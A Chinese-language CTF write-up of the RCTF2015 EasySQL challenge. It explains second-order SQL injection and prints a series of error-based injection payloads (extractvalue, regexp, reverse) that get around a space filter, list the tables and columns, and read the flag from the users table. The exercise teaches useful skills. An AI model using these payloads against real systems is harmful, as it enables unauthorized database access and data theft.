# \[RCTF2015\]EasySQL解题步骤详解

登陆成功到index.php，可以看到输入的信息被原封不动的插入到了数据库。

![](../Images/a51e4885663d676ee58ec192557c473a.png)

![](../Images/8e2e1146b1445baba85004cb3fce7c78.png)

点击change\_password跳转到changepwd.php

修改密码123为1234后，发现sql语句报错。

![](../Images/3755d5eec9aa0b3390b5fe5c524ee7f7.png)

*   
*   

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\" and pwd='202cb962ac59075b964b07152d234b70'' at line 1

```

可以看出，后台的sql语句为

*   
*   

```
select * from table where username="admin'"\" and pwd='202cb962ac59075b964b07152d234b70'

```

可以看出这是一道二次注入的题，看到网上有位老哥的解释很到位：

*   
*   
*   
*   
*   

```
二次注入，可以概括为以下两步:第一步：插入恶意数据进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。第二步：引用恶意数据开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。
```

这道题在进行注册的时候，对用户输入的特殊字符进行了转义处理，使用户的输入被原封不动的写入到到数据库中，在changepwd.php中提交修改密码时，后台从数据库中读出恶意代码，没有进行进一步的检验，直接插入到查询语句中，完成了一次查询,导致sql注入漏洞。

  

由于出现了sql语句报错，可以结合报错注入来做。

构造sql语句

*   
*   

```
"||(extractvalue(1,concat(0x7e,(select database()),0x7e)));#

```

发现有过滤

![](../Images/5a7f5b8a423118b39ca20a35e4704c1c.png)

抓包fuzz字典跑一下，过滤如下（空格也被过滤了）：

![](../Images/b92e70210bbae67df503f43e2eef5f65.png)

重新构造payload

（查询数据库）

*   
*   

```
"||(extractvalue(1,concat(0x7e,(select(database())),0x7e)));#

```

web\_sqli

![](../Images/d28f5b0a7e660a4176afe119c140e7ac.png)

  

（查询表名）

*   
*   

```
"||(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e)));#

```

article,flag,users  

![](../Images/868815450f49ee3aafb88c151cdc6e40.png)

(查询列名)

*   
*   

```
"||(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users')),0x7e)));#

```

![](../Images/f39c3fec025af188e8939a1d529f8e11.png)

由于报错注入有长度限制，故而使用正则匹配以r开头的列名。  

*   
*   

```
"||(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users'&&(column_name)regexp('^r'))),0x7e)));#

```

![](../Images/e1b09b0f93aa206facdfd44a546e636b.png)

flag表字段名:flag

users表字段名:name,pwd,email,real\_flag\_1s\_here

真正的flag在users表中

（查询字段值）

*   
*   

```
"||(extractvalue(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where((real_flag_1s_here)regexp('^f'))),0x7e)));#

```

![](../Images/ae9519bfb145101b1ba00497f6e06291.png)

只查到一半

使用reverse()函数，将查询结果倒序输出即可。

*   
*   

```
"||(extractvalue(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where((real_flag_1s_here)regexp('^f')))),0x7e)));#

```

![](../Images/4d4b88c7c3758a73f5e44c10cd115af9.png)

得到完整的flag。
